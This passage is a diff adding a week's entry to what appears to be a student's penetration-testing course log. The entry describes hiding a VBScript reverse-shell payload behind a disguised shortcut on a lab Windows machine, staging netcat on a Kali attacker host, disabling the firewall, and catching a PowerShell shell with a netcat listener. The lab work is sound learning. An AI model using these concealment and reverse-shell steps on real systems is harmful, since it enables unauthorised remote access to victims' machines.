@@ -422,3 +422,87 @@ I also need to remember to do the following tasks:
   - Comment the code at least on (near) finalized work, and ask the team to clarify points I'm not sure on
   - Mitigations for the vagrantfile need to be written up
   - Update the YouTube page & finish writing up the rest of the README:s for the Git repo
+
+# Week 47
+
+Testing testing...?
+
+I made [an installation guide](windows.md) for installing a target Windows machine. Now to test the homework we gave out to Tero for his [penetration testing class](https://terokarvinen.com/2023/eettinen-hakkerointi-2023/).
+
+I started out by making a folder called `This is a USB stick` in the Documents folder of my Windows machine. In the folder, I made a file called revsh.vbs. I pressed the `View`-button on the folder, and selected the tabs `Show hidden files` and `Show hidden files`. I then entered the code I got from [our revshell demo page](/payloads/revshell/payload/revsh.vbs) into the file, saved, and went to the properties of the file.
+
+![](images/w47_3.png)
+
+![](images/w47_4.png)
+
+![](images/w47_5.png)
+
+The file should now show up as a [VBScript script-file](https://en.wikipedia.org/wiki/VBScript) VBScript is a scripting language, and the well-documented code tells us, that the script downloads two text files, netcat, starts up netcat and opens a connection to the <ATTACKER IP>. Changing those parts of the script is integral for making the script work.
+
+![](images/w47_6.png)
+
+After editing the payload file, I selected the View tab again, and unticked the file extension & view hidden files -boxes. The .vbs-file disappeared! Like magic!
+
+![](images/w47_7.png)
+
+After reading the directions again, I realized I should've made an invisible folder, not making the actual .vbs invisible. Quick fix, make folder, move file into folder, make changes to folder properties:
+
+![](images/w47_8.png)
+
+Right-click -> New -> Shortcut -> pointed the shortcut to my payload:
+
+![](images/w47_9.png)
+
+I double clicked the shortcut, and was met with an error:
+
+![](images/w47_10.png)
+
+Oh yeah, I should probably have the required files to download on the attacker! I downloaded the nc64.exe from [our repo](https://github.com/therealhalonen/PhishSticks/tree/master/payloads/revshell_demo/.payload). I also made a file called 'raport.txt' with arbitrary info inside.
+
+```
+
+┌──(susi㉿isopaha)-[~]
+└─$ mkdir Attacker   
+
+┌──(susi㉿isopaha)-[~]
+└─$ cd Attacker   
+                                                                                            
+┌──(susi㉿isopaha)-[~/Attacker]
+└─$ cp ~/Downloads/nc64.exe .
+
+┌──(susi㉿isopaha)-[~/Attacker]
+└─$ nano raport.txt
+
+┌──(susi㉿isopaha)-[~/Attacker]
+└─$ ls
+nc64.exe  raport.txt
+
+
+```
+
+After discussing the error with [miljonka](https://github.com/miljonka/), we found out that I had ufw enabled on my Kali. Turning it off with `sudo ufw disable` fixed the problem. We tinkered around with the ports so the code changed a bit, but the theory still stands. Now double clicking the shortcut results in the .txt file opening, and netcat executing in the background with no noticeable actions happening on screen.
+
+![](images/w47_11.png)
+
+This is a good time to start listening in on your attacker machine. I opened up a netcat session on my Kali:
+
+```
+
+┌──(susi㉿isopaha)-[~]
+└─$ nc -lvp 9001                  
+listening on [any] 9001 ...
+192.168.66.4: inverse host lookup failed: Host name lookup failure
+connect to [192.168.66.2] from (UNKNOWN) [192.168.66.4] 49680
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+PS C:\Users\uhrilammas\Documents\This is a USB stick\payload> 
+
+
+```
+
+To ensure that I had an actual connection formed, I made a folder in the directory I was in:
+
+![](images/w47_12.png)
